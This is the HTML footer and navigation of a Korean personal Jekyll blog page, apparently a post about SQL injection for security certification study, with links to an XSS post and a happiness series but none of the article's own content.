  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fbluesplatter.com%2Fis_certification%2FIS-Application-SQL_Injection%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fbluesplatter.com%2Fis_certification%2FIS-Application-SQL_Injection%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/wine/Wine_Apothic_Red/" class="pagination--pager" title="APOTHIC RED 아포틱 레드 (2019)
">이전</a>
    
    
      <a href="/is_certification/IS-Application-XSS/" class="pagination--pager" title="정보보안 - XSS(Cross Site Script)
">다음</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">참고</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/a%20life%20of%20happiness%20and%20fulfillment%20(%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6)/Happiness-08_Summary/" rel="permalink">A Life of Happiness and Fulfillment - 08. 요약
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-09-27T18:00:00+09:00">September 27, 2022</time>
      </span>
    

    

    
  </p>


    <p class="archive__item-excerpt" itemprop="description">요약
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/a%20life%20of%20happiness%20and%20fulfillment%20(%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6)/Happiness-07_Ignoring-The-Source-Within/" rel="permalink">A Life of Happiness and Fulfillment - 07. 내부의 근원을 무시
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-09-24T18:00:00+09:00">September 24, 2022</time>
      </span>
    

    

    
  </p>


    <p class="archive__item-excerpt" itemprop="description">내부의 근원을 무시하는 것
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/a%20life%20of%20happiness%20and%20fulfillment%20(%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6)/Happiness-06_Distrusting-Life/" rel="permalink">A Life of Happiness and Fulfillment - 06. 삶에 대한 불신
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-09-19T18:00:00+09:00">September 19, 2022</time>
      </span>
    

    

    
  </p>


    <p class="archive__item-excerpt" itemprop="description">삶에 대한 불신
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/a%20life%20of%20happiness%20and%20fulfillment%20(%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6)/Happiness-05_Happiness-Sins-Distrusting-others/" rel="permalink">A Life of Happiness and Fulfillment - 05. 타인에 대한 불신
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-09-19T12:00:00+09:00">September 19, 2022</time>
      </span>
    

    

    
  </p>


    <p class="archive__item-excerpt" itemprop="description">타인에 대한 불신
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="검색어를 입력하세요..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->
<!--
<script>
	(function(d, h, m){
    var js, fjs = d.getElementsByTagName(h)[0];
    if (d.getElementById(m)){return;}
    js = d.createElement(h); js.id = m;
    js.onload = function(){
        window.makerWidgetComInit({
        position: "left",          
        widget: "eqypoqmawbcz3azh-usiy9q7ma4ong1w1-juelcm3zfgcuwjds"                
    })};
    js.src = "https://makerwidget.com/js/embed.js";
    fjs.parentNode.insertBefore(js, fjs)
	}(document, "script", "dhm"))
</script>
-->
<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>팔로우:</strong></li>
    

    
      
        
          <li><a href="mailto:hyunik03@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
        
      
        
      
        
      
        
          <li><a href="https://github.com/HY03" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> 피드</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HY03. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "https://bluesplatter.com/is_certification/IS-Application-SQL_Injection/";  /* Replace PAGE_URL with your page's canonical URL variable */
      this.page.identifier = "/is_certification/IS-Application-SQL_Injection"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
    };
    (function() { /* DON'T EDIT BELOW THIS LINE */
      var d = document, s = d.createElement('script');
      s.src = 'https://bluesplatter.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
